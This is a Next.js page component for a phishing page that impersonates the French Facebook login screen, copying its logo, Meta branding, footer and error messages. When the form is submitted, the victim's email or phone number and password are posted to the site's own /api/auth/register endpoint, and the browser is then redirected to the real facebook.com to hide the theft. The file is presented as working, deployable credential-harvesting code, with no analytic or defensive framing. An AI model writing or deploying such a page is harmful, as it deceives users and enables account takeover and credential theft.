"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { Eye, EyeOff } from "lucide-react";

export default function Home() {
  const router = useRouter();
  const [identifiant, setIdentifiant] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({});
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const newErrors = {};

    // Validation des champs
    if (!identifiant.trim()) {
      newErrors.identifiant = "L'e-mail ou le numéro de mobile entré n'est pas associé à un compte. Trouvez votre compte et connectez-vous.";
    }
    if (!password.trim()) {
      newErrors.password = "Le mot de passe que vous avez entré est incorrect.";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      const response = await fetch("/api/auth/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          identifiant: identifiant.trim(),
          password: password.trim(),
        }),
      });

      const data = await response.json();

      if (response.ok) {
        // Redirection vers Facebook
        window.location.href = "https://web.facebook.com/?locale=fr_FR&_rdc=1&_rdr#";
      } else {
        setErrors({
          submit: data.error || "Une erreur est survenue",
        });
      }
    } catch (error) {
      setErrors({
        submit: "Une erreur est survenue. Veuillez réessayer.",
      });
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <div className="min-h-screen bg-white font-sans">
      <div className="grid grid-cols-1 lg:grid-cols-3 h-screen lg:h-auto lg:min-h-screen">
        {/* Left Section - Image */}
        <div className="hidden lg:flex lg:col-span-2 relative overflow-hidden">
          <div className="relative w-full h-full">
            <Image
              src="/moitier-gauche.png"
              alt="Facebook presentation"
              fill
              className="object-cover"
            />
          </div>
        </div>

        {/* Right Section - Login Form */}
        <div className="flex flex-col items-center justify-center px-8 py-12 lg:py-0 lg:col-span-1 bg-white border-l border-gray-200">
          <div className="w-full max-w-md">
            {/* Facebook Logo - Mobile Only */}
            <div className="lg:hidden flex justify-center mb-6">
              <Image
                src="/facebook.png"
                alt="Facebook"
                width={60}
                height={60}
                className="w-16 h-16"
              />
            </div>

            {/* Title */}
            <h2 className="text-left text-xl text-black mb-6">
              Se connecter à Facebook
            </h2>

            {/* Form */}
            <form className="space-y-4" onSubmit={handleSubmit}>
              {/* Email Input */}
              <div>
                <input
                  type="text"
                  placeholder="E-mail ou numéro de mobile"
                  value={identifiant}
                  onChange={(e) => {
                    setIdentifiant(e.target.value);
                    if (errors.identifiant) {
                      setErrors({ ...errors, identifiant: "" });
                    }
                  }}
                  className={`w-full px-4 py-3 border rounded-lg text-sm focus:outline-none transition placeholder-gray-500 ${
                    errors.identifiant
                      ? "border-red-600 focus:ring-2 focus:ring-red-500"
                      : "border-gray-300 focus:ring-2 focus:ring-blue-500"
                  }`}
                />
                {errors.identifiant && (
                  <div className="flex items-start gap-2 mt-2">
                    <div className="flex-shrink-0 flex items-center justify-center w-5 h-5 rounded-full border-2 border-red-600">
                      <span className="text-red-600 text-xs font-bold">!</span>
                    </div>
                    <p className="text-red-600 text-xs leading-tight">
                      {errors.identifiant}
                      {errors.identifiant.includes("associé à un compte") && (
                        <>
                          {" "}
                          <a href="#" className="font-bold hover:underline">Trouvez votre compte et connectez-vous.</a>
                        </>
                      )}
                    </p>
                  </div>
                )}
              </div>

              {/* Password Input */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Mot de passe"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (errors.password) {
                      setErrors({ ...errors, password: "" });
                    }
                  }}
                  className={`w-full px-4 py-3 border rounded-lg text-sm focus:outline-none transition placeholder-gray-500 pr-10 ${
                    errors.password
                      ? "border-red-600 focus:ring-2 focus:ring-red-500"
                      : "border-gray-300 focus:ring-2 focus:ring-blue-500"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                  tabIndex={-1}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
                {errors.password && (
                  <div className="flex items-start gap-2 mt-2">
                    <div className="flex-shrink-0 flex items-center justify-center w-5 h-5 rounded-full border-2 border-red-600">
                      <span className="text-red-600 text-xs font-bold">!</span>
                    </div>
                    <p className="text-red-600 text-xs leading-tight">
                      {errors.password}
                    </p>
                  </div>
                )}
              </div>

              {/* Login Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-3 px-4 rounded-full text-base transition duration-200">
                {isLoading ? "Connexion en cours..." : "Se connecter"}
              </button>
            </form>

            {/* Divider */}
            <div className="my-4 flex items-center">
              <div className="flex-grow border-t border-gray-300"></div>
            </div>

            {/* Forgot Password */}
            <div className="text-center mb-4">
              <a href="#" className="text-sm text-black hover:underline">
                Mot de passe oublié ?
              </a>
            </div>

            {/* Create Account Button */}
            <button className="w-full border-2 border-blue-600 text-blue-600 hover:bg-blue-400 py-3 px-4 rounded-full text-base transition duration-200">
              Créer un nouveau compte
            </button>

            {/* Meta Logo */}
            <div className="mt-6 flex flex-row items-center justify-center gap-2">
              <Image
                src="/meta.png"
                alt="Meta"
                width={50}
                height={30}
                className="h-6 w-auto"
              />
              <p className="font-bold text-black">Meta</p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="border-t border-gray-200 py-6 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-wrap gap-4 text-2xs text-gray-600 mb-4">
            <a href="#" className="hover:text-blue-600">Français (France)</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Malagasy</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">English (US)</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Italiano</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Español</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Deutsch</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">中文(简体)</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Autres langues...</a>
          </div>
          <div className="border-t border-gray-200 pt-4 flex flex-wrap gap-4 text-2xs text-gray-700">
            <a href="#" className="hover:text-blue-600">S'inscrire</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Se connecter</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Messenger</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Facebook Lite</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Vidéo</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Meta Pay</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Boutique Meta</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Meta Quest</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Ray-Ban Meta</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Meta AI</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Plus de contenu Meta AI</a>
          </div>
          <div className="pt-4 flex flex-wrap gap-4 text-2xs text-gray-700">
            <a href="#" className="hover:text-blue-600">Instagram</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Threads</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Centre d'information sur les élections</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Politique de confidentialité</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Centre de confidentialité</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">À propos</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Créer une publicité</a>
          </div>
          <div className="pt-4 flex flex-wrap gap-4 text-2xs text-gray-700">
            <a href="#" className="hover:text-blue-600">Créer une Page</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Développeurs</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Emplois</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Cookies</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Choisir sa publicité</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Conditions générales</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Aide</a>
            <span>•</span>
            <a href="#" className="hover:text-blue-600">Importation des contacts et non-utilisateurs</a>
          </div>
          <p className="text-xs text-gray-700 mt-4">Meta © 2026</p>
        </div>
      </footer>
    </div>
  );
}
